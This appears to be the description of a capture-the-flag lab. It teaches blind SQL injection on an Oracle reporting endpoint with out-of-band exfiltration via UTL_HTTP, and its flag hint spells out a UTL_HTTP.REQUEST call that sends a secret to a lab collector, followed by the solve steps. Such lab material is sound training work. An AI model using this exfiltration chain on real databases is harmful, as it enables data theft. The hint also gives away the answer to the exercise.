title: Out-of-Band Exfiltration on Oracle via UTL_HTTP
learning_objectives: Recognise SQL injection in an Oracle-backed reporting endpoint (concatenated bind through a JDBC-style API)
Understand why in-band read is dead: the endpoint returns nothing on your payload, error text is scrubbed, and jitter kills the timing side channel
Chain the injection into an Oracle UTL_HTTP call that phones the exfil to a controlled listener the app never intended for you
Grant/consume network ACLs (DBMS_NETWORK_ACL_ADMIN) as an operational reality of Oracle 12c+/21c
Reason about egress-drop containment: the DB has no route off the host, so only the in-lab collector is reachable — the intended OOB channel
flag_hint: Chain the SQLi into UTL_HTTP.REQUEST('http://oob:9000/<exfil>') to POST the secret to the in-lab collector, read what it captured via GET /oob/received (app-side proxy — the collector is on the DB's no-egress network), then POST /solve {"secret":"<32 hex>"} for the flag.
inspired_by: The classic Chris Anley Oracle OOB paper and the modern Vozec/GossiTheDog Oracle OOB write-ups — abstracted, no vendor code reused
